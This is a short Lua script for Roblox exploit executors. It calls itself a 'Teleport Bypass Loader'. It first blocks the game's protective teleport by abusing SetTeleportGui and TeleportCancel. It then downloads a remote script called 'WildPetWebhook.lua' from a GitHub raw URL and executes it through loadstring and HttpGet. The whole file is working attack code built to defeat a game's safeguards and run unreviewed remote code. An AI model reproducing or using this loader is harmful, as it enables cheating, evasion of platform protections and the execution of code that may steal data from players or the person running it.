-- Teleport Bypass Loader → WildPetWebhook
-- Execute IMMEDIATELY - don't wait for game to load
local tpService = cloneref(game:GetService("TeleportService"))
tpService:SetTeleportGui(tpService)
print("✅ [BYPASS] TeleportGui set IMMEDIATELY - bypass active!")

-- Now wait for game to load
repeat wait() until game:IsLoaded()
print("🔄 [BYPASS] Game loaded, monitoring for teleport block...")

local logService = cloneref(game:GetService("LogService"))
local stoppedTp = false
local startTime = tick()
local maxWaitTime = 6
while not stoppedTp and (tick() - startTime) < maxWaitTime do
    for i,v in logService:GetLogHistory() do
        if v.message:find("cannot be cloned") then
            print("✅ [BYPASS] Teleport attempt detected and blocked!")
            stoppedTp = true
            break
        end
    end
    task.wait(0.05)
end

print("🔄 [BYPASS] Cancelling teleport...")
tpService:TeleportCancel()
tpService:SetTeleportGui(nil)
if stoppedTp then
    print("✅ [BYPASS] Bypass confirmed successful!")
else
    print("⚠️ [BYPASS] No teleport detected in " .. maxWaitTime .. "s - may not have been needed")
end

print("⏳ [LOADER] Loading worker script...")
wait(0.3)
print("📥 [LOADER] Loading worker script from GitHub...")
local success, result = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/Unnamedj/gag2/main/WildPetWebhook.lua"))()
end)
if success then
    print("✅ [LOADER] Worker script loaded and executed successfully!")
else
    warn("❌ [LOADER] Failed to load worker script: " .. tostring(result))
end
